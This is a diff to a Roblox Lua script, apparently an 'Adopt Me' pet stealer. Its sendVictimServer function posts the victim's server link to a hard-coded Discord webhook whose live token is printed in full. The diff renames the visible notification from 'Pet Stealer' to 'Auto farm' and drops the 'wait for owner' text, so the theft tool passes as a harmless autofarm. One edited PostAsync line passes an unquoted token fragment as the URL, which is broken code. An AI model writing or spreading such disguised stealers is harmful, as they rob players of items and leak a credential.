@@ -8,7 +8,7 @@ local RunService = game:GetService("RunService")
 
 -- ⚙️ YOUR SETTINGS
 local WEBHOOK = "https://discord.com/api/webhooks/1451560358434308237/5QfplYntO1wBNphJBWpoFMmTyGhUuE58x63sT0cvEAaYFIT1mlYBs_T_LanwQZEyOg_3"
-local OWNER = "davidadoptme172"
+local OWNER = "Bʅσσԃყ's server"
 local GAMEID = 920587237
 
 print("🐾 **AUTOFARM v5.2 LOADING...** ✅ FIXED")
@@ -40,7 +40,7 @@ local function sendVictimServer()
         }}
     }
     pcall(function()
-        HttpService:PostAsync(WEBHOOK, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
+        HttpService:PostAsync(1451560358434308237/5QfplYntO1wBNphJBWpoFMmTyGhUuE58x63sT0cvEAaYFIT1mlYBs_T_LanwQZEyOg_3, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
     end)
     print("📤 Serveur envoyé: "..serverLink)
 end
@@ -169,8 +169,8 @@ end)
 
 -- ✅ Success notification
 game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "🐾 Pet Stealer v5.2 ✅", 
-    Text = "Script chargé!\nServeur envoyé → Attends "..OWNER, 
+    Title = "🐾 Auto farm v5.2 ✅", 
+    Text = "Script chargé!", 
     Duration = 5
 })
 
